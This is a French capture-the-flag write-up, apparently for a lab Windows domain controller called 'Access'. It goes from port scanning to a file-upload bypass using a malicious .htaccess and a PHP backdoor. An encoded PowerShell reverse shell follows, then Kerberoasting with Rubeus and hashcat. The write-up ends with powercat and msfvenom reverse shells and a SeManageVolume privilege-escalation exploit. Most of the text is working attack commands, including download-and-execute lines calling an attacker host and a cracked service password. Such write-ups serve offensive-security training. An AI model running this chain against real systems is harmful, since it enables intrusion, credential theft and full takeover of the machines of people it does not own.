  # Access

	sudo  masscan  -p1-65535,U:1-65535 192.168.158.187 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.158.187 -oN nmap.txt
	feroxbuster --silent -u http://192.168.158.187
	
Scans classiques.

    PORT STATE SERVICE VERSION  
    53/tcp open domain Simple DNS Plus  
    80/tcp open http Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)  
    88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-22 16:49:46Z)  
    135/tcp open msrpc Microsoft Windows RPC  
    139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
    389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-  
    Site-Name)  
    445/tcp open microsoft-ds?  
    464/tcp open kpasswd5?  
    593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
    636/tcp open tcpwrapped  
    3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)  
    3269/tcp open tcpwrapped  
    5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
    9389/tcp open mc-nmf .NET Message Framing  
    49667/tcp open msrpc Microsoft Windows RPC  
    49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
    49697/tcp open msrpc Microsoft Windows RPC  
    49774/tcp open msrpc Microsoft Windows RPC


http://192.168.158.187/Forms/contact.php => 'Unable to load the "PHP Email Form" Library!'
</br>http://192.168.158.187/Uploads => Vide

En essayant d'acheter un ticket on voit qu'il y a la possibilité d'uploader des images. J'ai vérifié avec une image classique et à la fin de l'opération elle se retrouve bien dans le dossier découvert plus haut. J'ai tenté d'envoyer un reverse-shell en PHP mais un filtre m'a rejeté. J'ai directement tenté plusieurs techniques (null byte, double extension, aucune extension) qui ont fonctionné, mais le site semble ne pas interpréter les fichiers PHP sur la page des uploads.

En faisant des recherches sur l'interprétation du PHP je suis très vite tombé sur les fichiers .htaccess et sur la technique d'uploader notre propre fichier .htaccess pour modifier le comportement du site. 

	echo "AddType application/x-httpd-php .abc .png" > .htaccess

J'ai rajouté ces deux extensions pour tester à la fois le null byte et l'extension factice par curiosité, les deux versions de ma backdoor ont fonctionné. J'ai pu rapidement obtenir un reverse-shell : 

	curl http://192.168.158.187/Uploads/backdoor.php%2500.png?cmd=whoami
	curl http://192.168.158.187/Uploads/backdoor.php%2500.png?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D

Pivoting et élévation de privilèges : 

	iwr -Uri http://192.168.45.201/Rubeus.exe -Outfile ./Rubeus.exe
	./Rubeus.exe kerberoast 

On obtient le hash de svc_mssql.

	cat  hash.txt  |  tr  -d  " "  |  tr  -d  "\n" > hash_épuré.txt
	hashcat -m 13100 hash_épuré.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

La principale difficulté était de changer d'utilisateur sans avoir d'interface graphique et sans avoir de droits d'administrateur mais des scripts existent pour ce cas de figure : https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1


	iwr -Uri http://192.168.45.201/Invoke-RunasCs.ps1 -Outfile ./Invoke-RunasCs.ps1
	Import-Module ./Invoke-RunasCs.ps1
	Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
	Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.201/powercat.ps1'); powercat -c 192.168.45.201 -p 443 -e powershell"
	...
	whoami /priv
	

Il n'y a que la version Powercat qui a fonctionné, je n'ai pas réussi à faire fonctionner de reverse-shell avec MSFVenom même si je voyais bien la connexion se faire. On voit directement le "SeManageVolumePrivilege" nous indiquant que ce compte peut modifier n'importe quel fichier sur le système. 

Voici un bon résumé expliquant comment l'exploiter : https://github.com/xct/SeManageVolumeAbuse/blob/main/README.md

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.201 LPORT=9999 -f dll > tzres.dll
	sudo cp tzres.dll /var/www/html
	...
	iwr -Uri http://192.168.45.201/SeManageVolumeExploit.exe -Outfile Exploit.exe
	./Exploit.exe
	iwr -Uri http://192.168.45.201/tzres.dll -Outfile C:\Windows\System32\wbem\tzres.dll
	systeminfo
	...
	rlwrap nc -nvlp 9999
	type C:\Users\svc_mssql\Desktop\local.txt
	type C:\Users\Administrator\Desktop\proof.txt








